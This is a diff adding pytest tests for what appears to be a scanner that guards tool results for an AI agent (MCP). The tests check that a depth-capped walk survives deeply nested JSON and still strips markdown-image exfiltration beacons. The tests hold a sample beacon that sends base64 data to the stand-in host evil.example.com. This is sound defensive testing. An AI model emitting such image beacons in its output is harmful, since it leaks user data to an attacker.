@@ -193,5 +193,48 @@ def test_neutralize_exfil_deep_handles_plain_and_json():
     assert orch._neutralize_exfil_deep("{not valid json") == "{not valid json"
 
 
+# ── CHG-0114: deeply-nested JSON result must not DoS the render-leak walk. The walk
+# is depth-bounded + fail-safe, so a multi-thousand-deep untrusted result cannot
+# exhaust the Python stack (RecursionError) and silently disable exfil neutralization.
+
+
+def _nest(n, leaf="x"):
+    o = leaf
+    for _ in range(n):
+        o = [o]
+    return o
+
+
+@pytest.mark.parametrize("depth", [2000, 6000, 20000])
+def test_deep_nested_json_does_not_recursion_error(depth):
+    import mcp_scan_orchestrator as orch
+    # Must return (no RecursionError) regardless of nesting depth.
+    out = orch._neutralize_exfil_deep(json.dumps(_nest(depth)))
+    assert isinstance(out, str)
+
+
+def test_shallow_beacon_still_defanged_after_depth_cap():
+    import mcp_scan_orchestrator as orch
+    beacon = "![x](https://evil.example.com/l?d=" + _B64 + ")"
+    payload = json.dumps({"a": {"b": {"c": "see " + beacon}}})
+    out = orch._neutralize_exfil_deep(payload)
+    assert "![x](https://evil" not in out  # auto-render stripped at a realistic depth
+
+
+def test_beacon_within_cap_defanged():
+    import mcp_scan_orchestrator as orch
+    beacon = "![x](https://evil.example.com/l?d=" + _B64 + ")"
+    out = orch._neutralize_exfil_deep(json.dumps(_nest(150, leaf="see " + beacon)))
+    assert "![x](https://evil" not in out
+
+
+@pytest.mark.asyncio
+async def test_floor_survives_deeply_nested_result():
+    # The full result floor must not 500 / RecursionError on a deep untrusted result.
+    blob, blocked, tags, findings, meta = await _floor(json.dumps(_nest(8000)))
+    assert isinstance(blob, str)  # returned cleanly (no exception propagated)
+
+
+
 if __name__ == "__main__":
     raise SystemExit(pytest.main([__file__, "-q"]))
